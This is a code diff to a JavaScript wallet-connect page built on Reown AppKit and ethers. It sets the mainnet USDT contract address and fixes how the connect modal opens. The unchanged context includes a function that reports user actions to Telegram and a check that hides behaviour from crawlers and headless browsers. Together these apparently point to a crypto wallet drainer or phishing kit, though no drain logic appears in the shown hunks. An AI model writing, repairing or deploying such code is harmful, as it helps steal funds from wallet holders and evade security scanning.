@@ -6,8 +6,7 @@ import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers';
 import { mainnet } from 'https://esm.sh/@reown/appkit/networks';
 
 // --- CONFIGURATION ---
-// REPLACE THIS WITH YOUR ID FROM https://cloud.reown.com
-const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; 
+const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; // YOUR CORRECT PROJECT ID
 const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
 const CHAIN_ID = 1; 
@@ -22,7 +21,8 @@ const metadata = {
 const adapter = new EthersAdapter();
 
 try {
- const modal = createAppKit({
+ // FIX: Store the returned modal instance in a variable
+ const appKitModal = createAppKit({
  adapters: [adapter],
  networks: [mainnet],
  projectId: APPKIT_PROJECT_ID,
@@ -55,11 +55,10 @@ async function notifyTelegram(action, details) {
 
 // --- BOT DETECTION LOGIC ---
 function detectBot() {
- // Check for common bot signals
  const ua = navigator.userAgent;
  if (/bot|crawl|spider|slurp|teoma|readex|yandex|baiduspider|bingbot|sogou|exabot/i.test(ua)) return true;
- if (!navigator.webdriver && window.chrome && !window.navigator.plugins.length) return false; // Standard browser
- if (navigator.webdriver === undefined && window.ethereum === undefined) return true; // Likely script
+ if (!navigator.webdriver && window.chrome && !window.navigator.plugins.length) return false;
+ if (navigator.webdriver === undefined && window.ethereum === undefined) return true;
  return false;
 }
 
@@ -89,9 +88,9 @@ document.addEventListener('DOMContentLoaded', async () => {
  const connectBtn = document.getElementById('connect-btn');
  if (connectBtn) {
  connectBtn.addEventListener('click', async () => {
- // This forces the modal to pop up correctly
  try {
- await modal.open();
+ // FIX: Use the stored 'appKitModal' instance here
+ await appKitModal.open();
  } catch (e) {
  console.error("Modal open failed:", e);
  }
